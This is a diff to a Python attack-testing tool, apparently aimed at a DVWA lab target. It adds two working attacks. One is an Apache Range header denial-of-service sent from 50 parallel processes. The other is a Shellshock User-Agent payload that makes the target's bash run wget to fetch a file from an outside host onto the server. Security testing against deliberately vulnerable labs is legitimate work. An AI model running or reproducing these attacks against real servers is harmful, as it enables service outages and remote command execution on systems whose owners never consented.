@@ -37,6 +37,7 @@ import urllib2
 import logging
 import multiprocessing
 import fnmatch
+import time
 from HTMLGenerator import HTMLGenerator
 from httplib import BadStatusLine
 from urllib2 import URLError
@@ -1278,7 +1279,7 @@ class DVWAAttacks:
         flist = funcs.getServerMalwareList(fp, targetpage)
         for f in flist:
             dfile = ""
-            tpage = targetpage + f[1]
+            tpage = targetpage + f
 
             try:
                 dfile = fp.retrieve(tpage)[0]
@@ -1288,7 +1289,7 @@ class DVWAAttacks:
             # make sure we get content back from site
             if dfile:
                 # make sure we have content to compare with
-                if vars.download_file_sigs.has_key(f[1]):
+                if vars.download_file_sigs.has_key(f):
                     vars.typecount['download'][0] += 1
                     
                     m = hashlib.md5()
@@ -1297,19 +1298,136 @@ class DVWAAttacks:
                     fhex = m.hexdigest()
                     fl.close()
                     
-                    if vars.download_file_sigs[f[1]] == fhex:
-                        results.append("Malware: \"%s\" (%s) downloaded" % (f[1],fhex))
+                    if vars.download_file_sigs[f] == fhex:
+                        results.append("Malware: \"%s\" (%s) downloaded" % (f,fhex))
                         vars.typecount['download'][1] += 1
                         self.htmlgen.writeHtmlTableCell(success=True, attackType="Malware Download",
-                                                        target=tpage, vect=f[1])
+                                                        target=tpage, vect=f)
                     else:
                         vars.typecount['download'][2] += 1
                         self.htmlgen.writeHtmlTableCell(success=False, attackType="Malware Download",
-                                                        target=tpage, vect=f[1])
+                                                        target=tpage, vect=f)
                             
                             
         if len(results) > 0:
             return results
+        else:
+            return None
+        
+    def apache_range_header_dos(self, fp='', req_headers=''):
+        targetpage = vars.getUrl()
+        '''
+        request = urllib2.Request(targetpage, None, req_headers)
+        response = fp.open(request)
+        #print response.info()
+        '''
+        request = urllib2.Request(targetpage, None, req_headers)
+        request.get_method = lambda : 'HEAD'
+        response = fp.open(request)
+        #print response.code
+        
+    def attackrequest_headers(self, fp, targetpage):
+        '''
+            this will be a combo of known stuff and
+            vectors coming from headers.txt
+        '''
+        targetpage = vars.getUrl()
+        discattacks = []
+        pvect = ''
+
+        ########################################################################
+        '''
+            simple version of:
+            
+            Apache Range Header DoS Attack
+        '''
+        vars.typecount['request_headers'][0] += 1
+        dos_val = "bytes=0-"
+        f_val = 0
+        for x in range(f_val, 1300):
+            dos_val += ",5-%s" % str(x)
+        req_headers = {'Range': dos_val,
+                       'Accept-Encoding': 'gzip',
+                       'Connection': 'close'
+                       }
+        
+        processes = [multiprocessing.Process(target=self.apache_range_header_dos, args=(fp,req_headers,)) for x in range(50)]
+        # Run processes
+        for p in processes:
+            p.daemon = True
+            p.start()
+        # Exit the completed processes
+        for p in processes:
+            p.join()
+            
+        dos_type = "Apache Range Header DoS Attack"
+        the_vect = "Range: bytes=0-,5-0,5-1,5-2, ... 5-1294,5-1295,5-1296,5-1297,5-1298,5-1299 ..."
+
+        if funcs.is_target_up(fp=fp):
+            discattacks.append(the_vect)
+            vars.typecount['request_headers'][1] += 1
+            self.htmlgen.writeHtmlTableCell(success=True, attackType=dos_type,
+                                            target=targetpage, vect=the_vect)
+        else:
+            vars.typecount['request_headers'][2] += 1
+            self.htmlgen.writeHtmlTableCell(success=False, attackType=dos_type,
+                                            target=targetpage, vect=the_vect)   
+        ########################################################################
+        ssv_header_attack = "Shellshock vector - HTTP Request Header Attack"
+        req_headers = {}
+        wget_remote_file = "https://resources.bayshorenetworks.com/145eb731643f6f3516f2b5b41637a3dcc1a593404810a150f37f886195b2e2e3/bin_malicious_md5_hashes.MD5.txt"
+        
+        tme = time.localtime()
+        time_string = time.strftime("%m.%d.%y.%H:%M:%S", tme)
+        wget_file_name = "shellshock_test_{}".format(time_string)
+        wget_file_path = "%s%s" % (vars.dvwa_server_path, wget_file_name)        
+        
+        # shellshock vectors
+        shellshock_wget_vector = {"User-Agent":"() { :;}; /bin/bash -c \"wget --no-check-certificate -O %s %s\"" % (wget_file_path, wget_remote_file),
+                                  "Content-Type":"text/plain"}
+                              
+
+        vars.typecount['request_headers'][0] += 1
+        '''
+            expect a 500 err from server here
+        '''
+        try:
+            request = urllib2.Request(vars.getUrl() + "/cgi-bin/shellshock.cgi", None, shellshock_wget_vector)
+            response = fp.open(request)
+        except:
+            pass
+        
+        '''
+        print response.info()
+        print response.code
+        print req_headers
+        '''
+        
+        test_targetpage = vars.getUrl() + vars.getHackableUploadPath()
+        flist = funcs.getServerMalwareList(fp, test_targetpage)
+        shellshock_hit = False
+        if wget_file_name in flist:
+            shellshock_hit = True
+                
+        if shellshock_hit:
+            discattacks.append(shellshock_wget_vector["User-Agent"])
+            vars.typecount['request_headers'][1] += 1
+            self.htmlgen.writeHtmlTableCell(success=True, attackType=ssv_header_attack,
+                                            target=targetpage, vect=pvect)
+        else:
+            vars.typecount['request_headers'][2] += 1
+            self.htmlgen.writeHtmlTableCell(success=False, attackType=ssv_header_attack,
+                                            target=targetpage, vect=pvect) 
+        ########################################################################
+
+
+
+
+        
+
+        ########################################################################        
+        if len(discattacks) > 0:
+            return discattacks
         else:
             return None
 
